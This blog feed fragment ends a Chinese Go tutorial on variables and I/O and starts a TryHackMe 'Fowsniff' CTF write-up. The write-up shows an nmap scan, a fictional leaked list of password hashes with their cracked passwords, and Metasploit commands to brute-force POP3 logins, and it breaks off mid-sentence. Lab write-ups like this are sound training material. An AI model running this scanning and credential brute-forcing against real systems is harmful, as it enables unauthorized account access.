class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs verilog"><span class="hljs-keyword">var</span> (<br>  name    <span class="hljs-keyword">string</span><br>  age     <span class="hljs-keyword">int</span><br>  address <span class="hljs-keyword">string</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>  school <span class="hljs-keyword">string</span><br>  <span class="hljs-keyword">class</span> <span class="hljs-keyword">int</span><br>)<br></code></pre></td></tr></table></figure><p><strong>注：变量如果只是声明而不赋值，那么变量存储的值就是对应类型的零值。</strong></p><h2 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h2><p>跟 C 语言规则差不多，但还可以分别赋值，比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> name <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> age <span class="hljs-type">int</span><br>name, age = <span class="hljs-string">&quot;happy&quot;</span>, <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>但是每次都要指定类型，还可以短变量初始化，省略 <code>var</code> 关键字和后置类型，编译器会自己判断</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">name := <span class="hljs-string">&quot;happy&quot;</span><br></code></pre></td></tr></table></figure><p>虽然可以不用指定类型，但是在后续赋值时，类型必须保持一致，不然不能通过编译。还得注意的是，短变量初始化不能用 <code>nil</code>，因为 <code>nil</code> 不属于任何类型，编译器无法推断。</p><p>短变量还能批量初始化</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">name, age := <span class="hljs-string">&quot;happy&quot;</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>短变量声明虽然无法对一个已存在的变量使用，但是在赋值旧变量的同时声明一个新的变量时可以使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a := <span class="hljs-number">1</span><br>a, b := <span class="hljs-number">2</span>, <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>在 go 中，所有在函数中的变量都必须要被使用，如果只是声明了变量，没有使用它就会报错，但仅适用于函数内的变量，对于函数外的包级变量无用。</p><h2 id="匿名"><a href="#匿名" class="headerlink" title="匿名"></a>匿名</h2><p>用 <code>_</code> 可以表示不需要某一个变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">Open(name <span class="hljs-type">string</span>) (*File, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>比如 <code>os.Open</code> 函数有两个返回值，我们只想要第一个，不想要第二个，可以按照下面这样写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">file, _ := os.Open(<span class="hljs-string">&quot;readme.txt&quot;</span>)<br></code></pre></td></tr></table></figure><p>未使用的变量是无法通过编译的，当你不需要某一个变量时，就可以使用下划线 <code>_</code> 代替。</p><h2 id="交换"><a href="#交换" class="headerlink" title="交换"></a>交换</h2><p>在 go 中，如果想要交换两个变量的值，不需要使用指针，可以使用赋值运算符直接进行交换，语法上看起来非常直观，例子如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">num1, num2 := <span class="hljs-number">114</span>, <span class="hljs-number">514</span><br>num1, num2 = num2, num1<br></code></pre></td></tr></table></figure><p>三个变量也是如此</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">num1, num2, num3 := <span class="hljs-number">114</span>, <span class="hljs-number">514</span>, <span class="hljs-number">22</span><br>num1, num2, num3  = num3, num2, num1<br></code></pre></td></tr></table></figure><p>go 里面有一个特别有意思的规则，进行多个变量赋值运算时，它的顺序是先计算值再赋值，不是从左到右计算，这就和其他语言大相径庭了。比如说下面的例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b, c := <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span><br>a, b, c = b, c, a+b<br></code></pre></td></tr></table></figure><p>上面代码答案是</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>它会将 a, b, c 三个数的值分别计算好再赋给它们，就等同于下面这段代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b, c = <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>当涉及到函数调用时，这个效果就更明显，有一个函数<code>sum</code>可以计算两个数字的返回值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sum</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>  <span class="hljs-keyword">return</span> a + b<br>&#125;<br></code></pre></td></tr></table></figure><p>通过函数来进行两数相加</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b, c := <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span><br>a, b, c = b, c, sum(a, b)<br></code></pre></td></tr></table></figure><p>结果没有变化，因为在计算<code>sum</code>函数返回值时，它传入的参数依旧是 0 和 1</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>所以代码应该写成这样</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b = b, c<br>c = a + b<br></code></pre></td></tr></table></figure><h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p>变量之间的比较时它们的类型必须相同，go 语言中不存在隐式类型转换，像下面这样的代码编译是无法通过的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> a <span class="hljs-type">uint64</span><br>  <span class="hljs-keyword">var</span> b <span class="hljs-type">int64</span><br>  fmt.Println(a == b)<br>&#125;<br></code></pre></td></tr></table></figure><p>所以必须使用强制类型转换</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> a <span class="hljs-type">uint64</span><br>  <span class="hljs-keyword">var</span> b <span class="hljs-type">int64</span><br>  fmt.Println(<span class="hljs-type">int64</span>(a) == b)<br>&#125;<br></code></pre></td></tr></table></figure><p>可以使用 <code>min </code>函数比较最小值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">minVal := min(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">1.2</span>)<br></code></pre></td></tr></table></figure><p>使用 <code>max</code> 函数比较最大值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">maxVal := max(<span class="hljs-number">100</span>, <span class="hljs-number">22</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">1.12</span>)<br></code></pre></td></tr></table></figure><p>它们的参数支持所有的可比较类型，go 中的可比较类型有</p><ul><li>布尔</li><li>数字</li><li>字符串</li><li>指针</li><li>通道 （仅支持判断是否相等）</li><li>元素是可比较类型的数组（切片不可比较）（仅支持判断是否相等）（仅支持相同长度的数组间的比较，因为数组长度也是类型的一部分，而不同类型不可比较）</li><li>字段类型都是可比较类型的结构体（仅支持判断是否相等）</li></ul><p>除此之外，还可以通过导入标准库 <code>cmp</code> 来判断，不过仅支持有序类型的参数，在 go 中内置的有序类型只有数字和字符串。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;cmp&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  cmp.Compare(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>  cmp.Less(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>函数内部可以通过花括号建立一个代码块，彼此之间的变量作用域是相互独立的，不受干扰，无法访问，但是会受到父块中的影响。</p><h1 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h1><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>   Stdin  = NewFile(<span class="hljs-type">uintptr</span>(syscall.Stdin), <span class="hljs-string">&quot;/dev/stdin&quot;</span>)<br>   Stdout = NewFile(<span class="hljs-type">uintptr</span>(syscall.Stdout), <span class="hljs-string">&quot;/dev/stdout&quot;</span>)<br>   Stderr = NewFile(<span class="hljs-type">uintptr</span>(syscall.Stderr), <span class="hljs-string">&quot;/dev/stderr&quot;</span>)<br>)<br></code></pre></td></tr></table></figure><p>在 <code>os</code> 包下有三个外暴露的文件描述符，其类型都是 <code>*os.File</code> ，分别是：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">os.Stdin标准输入<br>os.Stdout标准输出<br>os.Stderr标准错误<br></code></pre></td></tr></table></figure><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>像读文件一样（麻烦）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> buf [<span class="hljs-number">1024</span>]<span class="hljs-type">byte</span><br>  n, _ := os.Stdin.Read(buf[:])<br>  os.Stdout.Write(buf[:n])<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p><code>fmt </code>包提供了几个函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 扫描从os.Stdin读入的文本，根据空格分隔，换行也被当作空格</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scan</span><span class="hljs-params">(a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// 与Scan类似，但是遇到换行停止扫描</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scanln</span><span class="hljs-params">(a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// 根据格式化的字符串扫描</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scanf</span><span class="hljs-params">(format <span class="hljs-type">string</span>, a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>读取两个数字</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> a, b <span class="hljs-type">int</span><br>  fmt.Scanln(&amp;a, &amp;b)<br>  fmt.Printf(<span class="hljs-string">&quot;%d + %d = %d\n&quot;</span>, a, b, a+b)<br>&#125;<br></code></pre></td></tr></table></figure><p>读取固定长度的数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  n := <span class="hljs-number">10</span><br>  s := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, n)<br>  <span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> n &#123;<br>    fmt.Scan(&amp;s[i])<br>  &#125;<br>  fmt.Println(s)<br>&#125;<br><br>&gt;&gt; <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span><br>&gt;&gt; [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span>]<br></code></pre></td></tr></table></figure><h3 id="bufio"><a href="#bufio" class="headerlink" title="bufio"></a>bufio</h3><p>有大量输入要读取的时建议使用 <code>bufio.Reader</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    reader := bufio.NewReader(os.Stdin)<br>    <span class="hljs-keyword">var</span> a, b <span class="hljs-type">int</span><br>    fmt.Fscanln(reader, &amp;a, &amp;b)<br>    fmt.Printf(<span class="hljs-string">&quot;%d + %d = %d\n&quot;</span>, a, b, a+b)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="scanner"><a href="#scanner" class="headerlink" title="scanner"></a>scanner</h3><p>与 <code>bufio.Reader</code>  类似，不过它按行读取</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  scanner := bufio.NewScanner(os.Stdin)<br>  <span class="hljs-keyword">for</span> scanner.Scan() &#123;<br>    line := scanner.Text()<br>    <span class="hljs-keyword">if</span> line == <span class="hljs-string">&quot;exit&quot;</span> &#123;<br>      <span class="hljs-keyword">break</span><br>    &#125;<br>    fmt.Println(<span class="hljs-string">&quot;scan&quot;</span>, line)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span><br>scan <span class="hljs-number">1</span><br><span class="hljs-number">2</span><br>scan <span class="hljs-number">2</span><br><span class="hljs-number">3</span><br>scan <span class="hljs-number">3</span><br>exit<br></code></pre></td></tr></table></figure><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><h3 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h3><p>可以直接将字符串写入到标准输出中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;os&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>os.Stdout.WriteString(<span class="hljs-string">&quot;hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="print-println"><a href="#print-println" class="headerlink" title="print&#x2F;println"></a>print&#x2F;println</h3><p>go 中两个内置的函数 <code>print</code>，<code>println</code>，他们会将参数输出到标准错误中，仅做调试用，一般不推荐使用</p><h3 id="fmt-1"><a href="#fmt-1" class="headerlink" title="fmt"></a>fmt</h3><p><code>fmt</code> 包提供了 <code>fmt.Println</code> 函数，该函数默认会将参数输出到标准输出中。它的参数<strong>支持任意类型</strong>，如果类型实现了 <code>String</code> 接口也会调用 <code>String </code>方法来获取其字符串表现形式，所以它输出的内容可读性比较高，适用于大部分情况，不过由于内部用到了反射，在性能敏感的场景不建议大量使用。</p><h3 id="bufio-1"><a href="#bufio-1" class="headerlink" title="bufio"></a>bufio</h3><p><code>bufio </code>提供了可缓冲的输出方法，它会先将数据写入到内存中，积累到了一定阈值再输出到指定的 <code>Writer</code> 中，默认缓冲区大小是 <code>4KB</code>，在文件 IO，网络 IO 的时候使用比较好。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  writer := bufio.NewWriter(os.Stdout)<br>  <span class="hljs-keyword">defer</span> writer.Flush()<br>  writer.WriteString(<span class="hljs-string">&quot;hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><p>go 中的格式化输出功能基本上由 <code>fmt.Printf</code> 函数提供，跟 C 语言差不多。在 <code>%</code> 与格式化动词之间加上一个空格能达到分隔符的效果。</p>]]></content>
    
    
    <categories>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Fowsniff CTF</title>
    <link href="/2025/01/21/Fowsniff/"/>
    <url>/2025/01/21/Fowsniff/</url>
    
    <content type="html"><![CDATA[<p>最近有点偷懒了owo </p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>先用 nmap 扫一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -T4 --min-rate <span class="hljs-number">1000</span> -sC -sV -p- <span class="hljs-number">10.10.108.176</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6fe50794710c00b6.png"></p><p>开放了 22、80、110、143 这4 个端口</p><p>访问一下发现了一个名叫 Fowsniff Corp 的公司，往下翻还能看见一条告示，大概意思是：@fowsniffcorp Twitter 账户被劫持了，上面可能会有敏感信息，那么我们去搜一下。</p><p><img src="https://img.dkdun.cn/v1/2025/12/24fa594eb2e4976d.png"></p><p>谷歌搜了一下，看描述找到了 twitter 发布的，点进去发现如下，有一个链接</p><p><img src="https://img.dkdun.cn/v1/2025/12/372908be9f9378be.png"></p><p>链接进去发现已经被下线了，只能看 WP 的信息了</p><p><img src="https://img.dkdun.cn/v1/2025/12/ec0ed336c8d9d0f9.png"></p><p>信息如下：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs applescript">FOWSNIFF CORP PASSWORD LEAK<br>            &#x27;&#x27;~``<br>           ( o o )<br>+<span class="hljs-comment">-----.oooO--(_)--Oooo.------+</span><br>|                            |<br>|          FOWSNIFF          |<br>|            got             |<br>|           PWN3D!!!         |<br>|                            |         <br>|       .oooO                |         <br>|        (   )   Oooo.       |         <br>+<span class="hljs-comment">---------\ (----(   )-------+</span><br>           \_)    ) /<br>                 (_/<br>FowSniff Corp got pwn3d <span class="hljs-keyword">by</span> B1gN1nj4!<br>No one <span class="hljs-keyword">is</span> safe <span class="hljs-keyword">from</span> <span class="hljs-keyword">my</span> <span class="hljs-number">1337</span> skillz!<br><br><br>mauer@fowsniff:<span class="hljs-number">8</span>a28a94a588a95b80163709ab4313aa4<br>mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56<br>tegel@fowsniff:<span class="hljs-number">1</span>dc352435fecca338acfd4be10984009<br>baksteen@fowsniff:<span class="hljs-number">19</span>f5af754c31f1e2651edde9250d69bb<br>seina@fowsniff:<span class="hljs-number">90</span>dc16d47114aa13671c697fd506cf26<br>stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd<br>mursten@fowsniff:<span class="hljs-number">0e9588</span>cb62f4b6f27e33d449e2ba0b3b<br>parede@fowsniff:<span class="hljs-number">4</span>d6e42f56e127803285a0a7649b5ab11<br>sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e<br><br>Fowsniff Corporation Passwords LEAKED!<br>FOWSNIFF CORP PASSWORD DUMP!<br><br>Here are their email passwords dumped <span class="hljs-keyword">from</span> their databases.<br>They left their pop3 server WIDE OPEN, too!<br><br>MD5 <span class="hljs-keyword">is</span> insecure, so you shouldn&#x27;t have trouble cracking them <span class="hljs-keyword">but</span> I was too lazy haha =P<br><br>l8r n00bz!<br><br>B1gN1nj4<br><br><span class="hljs-comment">-------------------------------------------------------------------------------------------------</span><br>This <span class="hljs-built_in">list</span> <span class="hljs-keyword">is</span> entirely fictional <span class="hljs-keyword">and</span> <span class="hljs-keyword">is</span> part <span class="hljs-keyword">of</span> a Capture <span class="hljs-keyword">the</span> Flag educational challenge.<br><br>All information contained within <span class="hljs-keyword">is</span> invented solely <span class="hljs-keyword">for</span> this purpose <span class="hljs-keyword">and</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> correspond<br><span class="hljs-keyword">to</span> any <span class="hljs-built_in">real</span> persons <span class="hljs-keyword">or</span> organizations.<br><br>Any similarities <span class="hljs-keyword">to</span> actual people <span class="hljs-keyword">or</span> entities <span class="hljs-keyword">is</span> purely coincidental <span class="hljs-keyword">and</span> occurred accidentally.<br></code></pre></td></tr></table></figure><p>从上面信息中我们能发现泄露了电子邮件地址和密码 hash 值</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mauer<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span>a28a94a588a95b80163709ab4313aa4<br>mustikka<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:ae1644dac5b77c0cf51e0d26ad6d7e56</span><br>tegel<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>dc352435fecca338acfd4be10984009<br>baksteen<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>f5af754c31f1e2651edde9250d69bb<br>seina<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">90</span>dc16d47114aa13671c697fd506cf26<br>stone<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:a92b8a29ef1183192e3d35187e0cfabd</span><br>mursten<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>e9588cb62f4b6f27e33d449e2ba0b3b<br>parede<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span>d6e42f56e127803285a0a7649b5ab11<br>sciana<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:f7fd98d380735e859f8b2ffbbede5a7e</span><br></code></pre></td></tr></table></figure><p>用 <a href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a> 解出密码</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">8a28a94a588a95b80163709ab4313aa4</span>:mailcall<br><span class="hljs-attribute">ae1644dac5b77c0cf51e0d26ad6d7e56</span>:bilbo101<br><span class="hljs-attribute">1dc352435fecca338acfd4be10984009</span>:apples01<br><span class="hljs-attribute">19f5af754c31f1e2651edde9250d69bb</span>:skyler22<br><span class="hljs-attribute">90dc16d47114aa13671c697fd506cf26</span>:scoobydoo2<br>a92b8a29ef1183192e3d35187e0cfabd：这个没找到<br><span class="hljs-attribute">0e9588cb62f4b6f27e33d449e2ba0b3b</span>:carp4ever<br><span class="hljs-attribute">4d6e42f56e127803285a0a7649b5ab11</span>:orlando12<br><span class="hljs-attribute">f7fd98d380735e859f8b2ffbbede5a7e</span>:07011972<br></code></pre></td></tr></table></figure><h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><h2 id="Metasploit-hydra"><a href="#Metasploit-hydra" class="headerlink" title="Metasploit &amp; hydra"></a>Metasploit &amp; hydra</h2><p>现在已经有用户名和密码了，那么可以使用 Metasploit 的 <code>pop3_login</code> 模块，使用之前找到的信息来暴力破解 POP3 </p><p><img src="https://img.dkdun.cn/v1/2025/12/9e60709cb2963e6f.png"></p><p>将用户名和密码分别添加到 usernames.txt 和 passwords.txt 里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/pop3/pop3_login<br><span class="hljs-built_in">set</span> rhost 10.10.253.104 (因为中间有事情出门了所以回来重新开的机器)<br><span class="hljs-built_in">set</span> user_file /home/butt3rf1y/usernames.txt<br><span class="hljs-built_in">set</span> pass_file /home/butt3rf1y/passwords.txt<br>run<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/418d66c60817deff.png"></p><p>爆出来发现 